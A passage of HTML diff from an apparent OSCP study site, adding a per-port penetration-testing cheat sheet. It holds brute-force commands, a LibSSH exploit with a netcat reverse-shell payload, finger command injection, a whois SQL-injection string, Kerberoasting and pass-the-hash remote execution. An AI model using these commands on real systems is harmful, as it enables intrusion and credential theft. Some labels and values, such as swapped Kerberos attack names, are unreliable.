@@ -71,6 +71,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#ports" class="md-skip">
+          Skip to content
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -315,7 +320,9 @@
   
 
 
-<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
     <a href="../.." title="OSCP Notes" class="md-nav__button md-logo" aria-label="OSCP Notes" data-md-component="logo">
       
@@ -474,6 +481,20 @@
       <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
       
       
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Ports
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
       
       <a href="./" class="md-nav__link md-nav__link--active">
         
@@ -485,6 +506,367 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#general" class="md-nav__link">
+    <span class="md-ellipsis">
+      General
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-21-ftp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 21 - FTP
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-22-ssh" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 22 - SSH
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-23-telnet" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 23 - Telnet
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-25-smtp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 25 - SMTP
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-43-whois" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 43 - Whois
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-53-dns" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 53 - DNS
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-69-udp-tftp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 69 - UDP - TFTP
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-79-finger" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 79 - Finger
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-88-kerberos" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 88 - Kerberos
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-110-pop3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 110 - Pop3
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-111-rpcbind" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 111 - Rpcbind
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-135-msrpc" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 135 - MSRPC
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-139445-smb" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 139/445 - SMB
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-161162-udp-snmp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 161/162 UDP - SNMP
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-389636-ldap" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 389,636 - LDAP
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-443-https" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 443 - HTTPS
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-500-isakmp-ike" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 500 - ISAKMP IKE
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-513-rlogin" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 513 - Rlogin
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-541-fortinet-sslvpn" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 541 - FortiNet SSLVPN
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-873-rsync" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 873 - Rsync
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-1433-mssql" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 1433 - MSSQL
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-1521-oracle" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 1521 - Oracle
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-2000-cisco-sccp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 2000 - Cisco sccp
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-2049-nfs" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 2049 - NFS
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-2100-oracle-xml-db" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 2100 - Oracle XML DB
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-3306-mysql" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 3306 - MySQL
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-3389-rdp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 3389 - RDP
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-5432-postgresql" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 5432 - PostgreSQL
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-5900-vnc" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 5900 - VNC
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-5984-couchdb" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 5984 - CouchDB
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-5985-winrm" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 5985 - WinRM
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-6379-redis" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 6379 - Redis
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-8172-msdeploy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 8172 - MsDeploy
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-56019200" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 5601/9200
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-27017-192708028017-mongodb" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 27017-19/27080/28017 - MongoDB
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#unknown-ports" class="md-nav__link">
+    <span class="md-ellipsis">
+      Unknown ports
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rce-ports" class="md-nav__link">
+    <span class="md-ellipsis">
+      RCE ports
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -893,22 +1275,6 @@
               </div>
             
             
-              
-              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
-                <div class="md-sidebar__scrollwrap">
-                  <div class="md-sidebar__inner">
-                    
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-  
-</nav>
-                  </div>
-                </div>
-              </div>
-            
           
           
             <div class="md-content" data-md-component="content">
@@ -921,9 +1287,1376 @@
   
 
 
-  <h1>Ports</h1>
+<h1 id="ports">Ports</h1>
+<h2 id="general">General</h2>
+<p>AIO <a href="http://0daysecurity.com/penetration-testing/enumeration.html">Penetration Testing Methodology - 0DAYsecurity.com</a></p>
+<h2 id="port-21-ftp">Port 21 - FTP</h2>
+<pre><code class="language-bash">nmap --script ftp-* -p 21 10.11.1.111
+</code></pre>
+<h2 id="port-22-ssh">Port 22 - SSH</h2>
+<ul>
+<li>If you have usernames test login with username:username</li>
+<li>Vulnerable Versions to user enum: &lt;7.7</li>
+</ul>
+<pre><code class="language-bash"># Enum SSH
+# Get version
+nmap 10.11.1.1 -p22 -sV
+# Get banner
+nc 10.11.1.1 22
+# Get login banner
+ssh root@10.11.11.1
+# Get algorythms supporteed
+nmap -p22 10.11.1.1 --script ssh2-enum-algos
+# Check weak keys
+nmap-p22 10.2.1.1 --script ssh-hostkey --script-args ssh_hostkey=full
+# Check auth methods
+nmap -p22 10.11.1.1 --script ssh-auth-methods --script-args=&quot;ssh.user=admin&quot;
+
+# User can ask to execute a command right after authentication before it’s default command or shell is executed
+$ ssh -v user@10.10.1.111 id
+...
+Password:
+debug1: Authentication succeeded (keyboard-interactive).
+Authenticated to 10.10.1.111 ([10.10.1.1114]:22).
+debug1: channel 0: new [client-session]
+debug1: Requesting no-more-sessions@openssh.com
+debug1: Entering interactive session.
+debug1: pledge: network
+debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
+debug1: Sending command: id
+debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
+debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
+uid=1000(user) gid=100(users) groups=100(users)
+debug1: channel 0: free: client-session, nchannels 1
+Transferred: sent 2412, received 2480 bytes, in 0.1 seconds
+Bytes per second: sent 43133.4, received 44349.5
+debug1: Exit status 0
+
+# Check Auth Methods:
+$ ssh -v 10.10.1.111
+OpenSSH_8.1p1, OpenSSL 1.1.1d  10 Sep 2019
+...
+debug1: Authentications that can continue: publickey,password,keyboard-interactive
+
+# Force Auth Method:
+$ ssh -v 10.10.1.111 -o PreferredAuthentications=password
+...
+debug1: Next authentication method: password
+
+# BruteForce:
+patator ssh_login host=10.11.1.111 port=22 user=root 0=/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt password=FILE0 -x ignore:mesg='Authentication failed.'
+hydra -l user -P /usr/share/wordlists/password/rockyou.txt -e s ssh://10.10.1.111
+medusa -h 10.10.1.111 -u user -P /usr/share/wordlists/password/rockyou.txt -e s -M ssh
+ncrack --user user -P /usr/share/wordlists/password/rockyou.txt ssh://10.10.1.111
+
+# LibSSH Before 0.7.6 and 0.8.4 - LibSSH 0.7.6 / 0.8.4 - Unauthorized Access 
+# Id
+python /usr/share/exploitdb/exploits/linux/remote/46307.py 10.10.1.111 22 id
+# Reverse
+python /usr/share/exploitdb/exploits/linux/remote/46307.py 10.10.1.111 22 &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.1.111 80 &gt;/tmp/f&quot;
+
+# SSH FUZZ
+# https://dl.packetstormsecurity.net/fuzzer/sshfuzz.txt
+
+# cpan Net::SSH2
+./sshfuzz.pl -H 10.10.1.111 -P 22 -u user -p user
+
+use auxiliary/fuzzers/ssh/ssh_version_2
+
+# SSH-AUDIT
+# https://github.com/arthepsy/ssh-audit                     
+
+# Enum users &lt; 7.7:
+# https://www.exploit-db.com/exploits/45233
+https://github.com/CaioCGH/EP4-redes/blob/master/attacker/sshUsernameEnumExploit.py
+python ssh_user_enum.py --port 2223 --userList /root/Downloads/users.txt IP 2&gt;/dev/null | grep &quot;is a&quot;
+
+# SSH Leaks:
+https://shhgit.darkport.co.uk/
+
+# SSH bruteforce
+# https://github.com/kitabisa/ssb
+</code></pre>
+<h2 id="port-23-telnet">Port 23 - Telnet</h2>
+<pre><code class="language-bash"># Get banner
+telnet 10.11.1.110
+# Bruteforce password
+patator telnet_login host=10.11.1.110 inputs='FILE0\nFILE1' 0=/root/Desktop/user.txt 1=/root/Desktop/pass.txt  persistent=0 prompt_re='Username: | Password:'
+</code></pre>
+<h2 id="port-25-smtp">Port 25 - SMTP</h2>
+<pre><code class="language-bash">nc -nvv 10.11.1.111 25
+HELO foo
+
+telnet 10.11.1.111 25
+VRFY root
+
+nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.11.1.111
+smtp-user-enum -M VRFY -U /root/sectools/SecLists/Usernames/Names/names.txt -t 10.11.1.111
+
+# SMTP relay
+msfconsole
+use auxiliary/scanner/smtp/smtp_relay
+set RHOSTS &lt;IP or File&gt;
+set MAILFROM &lt;PoC email address&gt;
+set MAILTO &lt;your email address&gt;
+run
+
+# Send email unauth:
+
+MAIL FROM:admin@admin.com
+RCPT TO:DestinationEmail@DestinationDomain.com
+DATA
+test
+
+.
+
+Receive:
+250 OK
+</code></pre>
+<h2 id="port-43-whois">Port 43 - Whois</h2>
+<pre><code class="language-bash">whois -h 10.10.1.111 -p 43 &quot;domain.com&quot;
+echo &quot;domain.com&quot; | nc -vn 10.10.1.111 43
+whois -h 10.10.1.111 -p 43 &quot;a') or 1=1#&quot;
+</code></pre>
+<h2 id="port-53-dns">Port 53 - DNS</h2>
+<pre><code class="language-bash"># Transfer zone
+
+dig AXFR domain.com @10.10.10.10
+# dig +multi AXFR @ns1.insecuredns.com insecuredns.com
+dnsrecon -t axfr -d domain
+fierce -dns domain.com
+</code></pre>
+<h2 id="port-69-udp-tftp">Port 69 - UDP - TFTP</h2>
+<ul>
+<li>Vulns tftp in server 1.3, 1.4, 1.9, 2.1, and a few more.</li>
+<li>Same checks as FTP Port 21.</li>
+</ul>
+<pre><code class="language-bash">nmap -p69 --script=tftp-enum.nse 10.11.1.111
+</code></pre>
+<h2 id="port-79-finger">Port 79 - Finger</h2>
+<pre><code class="language-bash">nc -vn 10.11.1.111 79
+echo &quot;root&quot; | nc -vn 10.11.1.111 79
+
+# User enumeration
+finger @10.11.1.111       #List users
+finger admin@10.11.1.111  #Get info of user
+finger user@10.11.1.111   #Get info of user
+
+finger &quot;|/bin/id@example.com&quot;
+finger &quot;|/bin/ls -a /@example.com&quot;
+</code></pre>
+<h2 id="port-88-kerberos">Port 88 - Kerberos</h2>
+<p>Check <a href="../post-exploitation/windows/ad/kerberos-attacks.md">Kerberos dedicated</a> section</p>
+<pre><code class="language-bash">nmap -p 88 --script=krb5-enum-users --script-args=&quot;krb5-enum-users.realm='DOMAIN.LOCAL'&quot; IP
+use auxiliary/gather/kerberos_enumusers # MSF
+
+# Check for Kerberoasting: 
+GetNPUsers.py DOMAIN-Target/ -usersfile user.txt -dc-ip &lt;IP&gt; -format hashcat/john
+
+# GetUserSPNs
+ASREPRoast:
+impacket-GetUserSPNs &lt;domain_name&gt;/&lt;domain_user&gt;:&lt;domain_user_password&gt; -request -format &lt;AS_REP_responses_format [hashcat | john]&gt; -outputfile &lt;output_AS_REP_responses_file&gt;
+impacket-GetUserSPNs &lt;domain_name&gt;/ -usersfile &lt;users_file&gt; -format &lt;AS_REP_responses_format [hashcat | john]&gt; -outputfile &lt;output_AS_REP_responses_file&gt;
+
+# Kerberoasting: 
+impacket-GetUserSPNs &lt;domain_name&gt;/&lt;domain_user&gt;:&lt;domain_user_password&gt; -outputfile &lt;output_TGSs_file&gt; 
+
+# Overpass The Hash/Pass The Key (PTK):
+python3 getTGT.py &lt;domain_name&gt;/&lt;user_name&gt; -hashes [lm_hash]:&lt;ntlm_hash&gt;
+python3 getTGT.py &lt;domain_name&gt;/&lt;user_name&gt; -aesKey &lt;aes_key&gt;
+python3 getTGT.py &lt;domain_name&gt;/&lt;user_name&gt;:[password]
+
+# Using TGT key to excute remote commands from the following impacket scripts:
+
+python3 psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
+python3 smbexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
+python3 wmiexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
+
+# https://www.tarlogic.com/blog/como-funciona-kerberos/
+# https://www.tarlogic.com/blog/como-atacar-kerberos/
+
+python kerbrute.py -dc-ip IP -users /root/htb/kb_users.txt -passwords /root/pass_common_plus.txt -threads 20 -domain DOMAIN -outputfile kb_extracted_passwords.txt
+
+# https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/
+# https://github.com/GhostPack/Rubeus
+# https://github.com/fireeye/SSSDKCMExtractor
+# https://gitlab.com/Zer1t0/cerbero
+</code></pre>
+<h2 id="port-110-pop3">Port 110 - Pop3</h2>
+<pre><code class="language-bash">telnet 10.11.1.111
+USER pelle@10.11.1.111
+PASS admin
+
+# or:
+
+USER pelle
+PASS admin
+
+# List all emails
+list
+
+# Retrieve email number 5, for example
+retr 9
+</code></pre>
+<h2 id="port-111-rpcbind">Port 111 - Rpcbind</h2>
+<pre><code class="language-bash">rpcinfo -p 10.11.1.111
+rpcclient -U &quot;&quot; 10.11.1.111
+    srvinfo
+    enumdomusers
+    getdompwinfo
+    querydominfo
+    netshareenum
+    netshareenumall
+</code></pre>
+<h2 id="port-135-msrpc">Port 135 - MSRPC</h2>
+<p>Some versions are vulnerable.</p>
+<pre><code class="language-bash">nmap 10.11.1.111 --script=msrpc-enum
+msf &gt; use exploit/windows/dcerpc/ms03_026_dcom
+
+# Endpoint Mapper Service Discovery
+use auxiliary/scanner/dcerpc/endpoint_mapper
+
+#Hidden DCERPC Service Discovery
+use auxiliary/scanner/dcerpc/hidden
+
+# Remote Management Interface Discovery
+use auxiliary/scanner/dcerpc/management
+
+# DCERPC TCP Service Auditor
+use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor
+
+impacket-rpcdump
+
+# Enum network interface
+# https://github.com/mubix/IOXIDResolver
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Named pipe</th>
+<th>Description</th>
+<th>Service or process</th>
+<th>Interface identifier</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>atsvc</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_scheduler.html">atsvc</a> interface (Scheduler service)</th>
+<th>mstask.exe</th>
+<th>1ff70682-0a51-30e8-076d-740be8cee98b v1.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>AudioSrv</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_audio.html">AudioSrv</a> interface (Windows Audio service)</th>
+<th>AudioSrv</th>
+<th>3faf4738-3a21-4307-b46c-fdda9bb8c0d5 v1.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>browser (ntsvcs alias)</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_browser.html">browser</a> interface (Computer Browser service)</th>
+<th>Browser</th>
+<th>6bffd098-a112-3610-9833-012892020162 v0.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>cert</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_certsrv.html">ICertPassage</a> interface (Certificate services)</th>
+<th>certsrv.exe</th>
+<th>91ae6020-9e3c-11cf-8d7c-00aa00c091be v0.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>Ctx_Winstation_API_Service</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_termsrv.html">winstation_rpc</a> interface</th>
+<th>termsrv.exe</th>
+<th>5ca4a760-ebb1-11cf-8611-00a0245420ed v1.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>DAV RPC SERVICE</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_davclntrpc.html">davclntrpc</a> interface (WebDAV client service)</th>
+<th>WebClient</th>
+<th>c8cb7687-e6d3-11d2-a958-00c04f682e16 v1.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>dnsserver</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_dns.html">DnsServer</a> interface (DNS Server service)</th>
+<th>dns.exe</th>
+<th>50abc2a4-574d-40b3-9d66-ee4fd5fba076 v5.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>epmapper</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/rpcss_msrpc_interfaces.html">epmp</a> interface (RPC endpoint mapper)</th>
+<th>RpcSs</th>
+<th>e1af8308-5d1f-11c9-91a4-08002b14a0fa v3.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>eventlog (ntsvcs alias)</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_eventlog.html">eventlog</a> interface (Eventlog service)</th>
+<th>Eventlog</th>
+<th>82273fdc-e32a-18c3-3f78-827929dc23ea v0.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>HydraLsPipe</th>
+<th>Terminal Server Licensing</th>
+<th>lserver.exe</th>
+<th>3d267954-eeb7-11d1-b94e-00c04fa3080d v1.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>InitShutdown</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_winlogon_w2k.html">InitShutdown</a> interface</th>
+<th>winlogon.exe</th>
+<th>894de0c0-0d55-11d3-a322-00c04fa321a1 v1.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>keysvc</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_cryptsvc.html">IKeySvc</a> interface (Cryptographic services)</th>
+<th>CryptSvc</th>
+<th>8d0ffe72-d252-11d0-bf8f-00c04fd9126b v1.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>keysvc</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_cryptsvc.html">ICertProtect</a> interface (Cryptographic services)</th>
+<th>CryptSvc</th>
+<th>0d72a7d4-6148-11d1-b4aa-00c04fb66ea0 v1.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>locator</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_locator.html">NsiS</a> interface (RPC Locator service)</th>
+<th>locator.exe</th>
+<th>d6d70ef0-0e3b-11cb-acc3-08002b1d29c4 v1.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>llsrpc</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_llsrpc.html">llsrpc</a> interface (Licensing Logging service)</th>
+<th>llssrv.exe</th>
+<th>342cfd40-3c6c-11ce-a893-08002b2e9c6d v0.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>lsarpc (lsass alias)</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_lsarpc.html">lsarpc</a> interface</th>
+<th>lsass.exe</th>
+<th>12345778-1234-abcd-ef00-0123456789ab v0.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>lsarpc (lsass alias)</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_dssetup.html">dssetup</a> interface</th>
+<th>lsass.exe</th>
+<th>3919286a-b10c-11d0-9ba8-00c04fd92ef5 v0.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>msgsvc (ntsvcs alias)</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_msgsvc.html">msgsvcsend</a> interface (Messenger service)</th>
+<th>messenger</th>
+<th>5a7b91f8-ff00-11d0-a9b2-00c04fb6e6fc v1.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>nddeapi</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_nddeapi.html">nddeapi</a> interface (NetDDE service)</th>
+<th>netdde.exe</th>
+<th>2f5f3220-c126-1076-b549-074d078619da v1.2</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>netdfs</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_netdfs.html">netdfs</a> interface (Distributed File System service)</th>
+<th>Dfssvc</th>
+<th>4fc742e0-4a10-11cf-8273-00aa004ae673 v3.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>netlogon (lsass alias)</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_netlogon.html">netlogon</a> interface (Net Logon service)</th>
+<th>Netlogon</th>
+<th>12345678-1234-abcd-ef00-01234567cffb v1.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>ntsvcs</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_pnp.html">pnp</a> interface (Plug and Play service)</th>
+<th>PlugPlay</th>
+<th>8d9f4e40-a03d-11ce-8f69-08003e30051b v1.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>plugplay</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_pnp.html">pnp</a> interface (Plug and Play Windows Vista service)</th>
+<th>PlugPlay</th>
+<th>8d9f4e40-a03d-11ce-8f69-08003e30051b v1.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
